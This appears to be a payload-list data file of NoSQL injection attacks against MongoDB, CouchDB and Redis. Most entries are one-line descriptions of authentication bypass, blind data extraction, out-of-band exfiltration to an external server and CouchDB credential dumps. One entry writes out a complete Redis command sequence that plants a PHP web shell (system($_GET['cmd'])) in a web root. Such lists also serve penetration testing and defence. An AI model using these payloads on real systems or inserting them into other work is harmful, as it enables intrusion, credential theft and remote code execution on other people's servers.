meta.name: NoSQL Injection
meta.description: NoSQL injection payloads for MongoDB, CouchDB, and Redis. Covers authentication bypass, operator injection, blind detection, and OOB exfiltration.

payloads.description: MongoDB auth bypass — $gt operator matches any non-empty string, bypassing login
MongoDB auth bypass targeting admin — force password comparison to succeed
Regex operator bypass — $regex with wildcard matches any value
$ne (not equal) operator — password must simply not equal a dummy value
$in operator — try multiple usernames at once with password bypass
$where with sleep — time-based blind NoSQL injection via JS execution
$where field enumeration — test field existence and length via JS expressions
$where character brute-force — extract password char by char via boolean blind
Regex blind extraction — iterate regex anchors to extract field values char by char
HTTP parameter pollution — inject MongoDB operators via query string in web apps
URL parameter $ne injection — many Node.js/Express apps parse this into a MongoDB operator
URL-based regex operator — inject into query string for regex auth bypass
OOB exfiltration via $where — send field value to external server (needs outbound from DB host)
$comment operator injection — inject into query comments, can break filters
NoSQL string injection probe — single quote injection to detect string concatenation into queries
JSON body injection probe — inject $where via loose JSON parsing in some frameworks
CouchDB all docs endpoint — access all documents without authentication if misconfigured
CouchDB users database — dump all user records including hashed credentials
CouchDB admin user creation — register new admin via /_users if signup is open
CouchDB config endpoint — read admin credentials and config (requires admin or misconfiguration)
Redis KEYS * — list all keys in the database, works when Redis is exposed without auth
Redis config write — change working directory to web root for web shell write (RCE via SSRF)

payloads.code:
CONFIG SET dbfilename shell.php
SET payload "<?php system($_GET['cmd']); ?>"
BGSAVE
payloads.description: Redis web shell write — set directory + filename then BGSAVE to write PHP shell to webroot
SSRF → Redis via gopher — flush Redis DB via SSRF using gopher protocol
$exists operator — returns any document where both fields exist, useful for auth bypass
